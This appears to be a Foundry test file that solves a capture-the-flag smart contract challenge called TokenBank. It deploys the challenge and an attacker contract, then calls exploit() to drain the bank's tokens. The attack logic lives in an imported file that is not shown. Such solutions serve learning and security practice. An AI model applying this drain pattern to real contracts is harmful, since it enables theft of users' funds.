// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/TokenBank.sol";

contract TankBankTest is Test {
    TokenBankChallenge public tokenBankChallenge;
    TokenBankAttacker public tokenBankAttacker;
    address player = address(1234);

    function setUp() public {}

    function testExploit() public {
        tokenBankChallenge = new TokenBankChallenge(player);
        tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));

        // player transfers tokens to attacker
        vm.startPrank(player);
        uint amount = tokenBankChallenge.balanceOf(player);
        tokenBankChallenge.withdraw(amount);
        SimpleERC223Token token = tokenBankChallenge.token();
        // Attacker deposits tokens and calls exploit, which withdraws tokens until bank is drained.
        token.transfer(address(tokenBankAttacker), amount);
        vm.stopPrank();

        vm.startPrank(address(tokenBankAttacker));
        token.transfer(address(tokenBankChallenge), amount);
        tokenBankAttacker.exploit();
        vm.stopPrank();

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenBankChallenge.isComplete(), "Challenge Incomplete");
    }
}
